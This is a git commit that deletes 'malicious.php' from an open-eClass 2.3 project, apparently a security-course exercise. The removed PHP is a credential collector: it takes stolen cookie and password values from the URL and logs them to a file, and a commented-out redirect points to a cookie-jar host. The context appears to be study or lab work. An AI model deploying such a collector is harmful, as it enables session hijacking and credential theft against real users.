91d2a6957345588f7a997bda1819644c0f75f5ed
MariaGkoulta <marygkoulta@gmail.com>
2020-05-06 16:02:39 +0300

    Remove unnecessary files

--- openeclass-2.3/malicious.php
+++
@@ -1,7 +0,0 @@
-<?php
-//header ('Location:http://cookies_jar.csec.gr/');
-$cookies = $_GET["cookie"];
-$file = fopen('log.txt', 'a');
-$password = $_GET["pass"];
-fwrite($file, $cookies, $password . "\n\n");
-?>
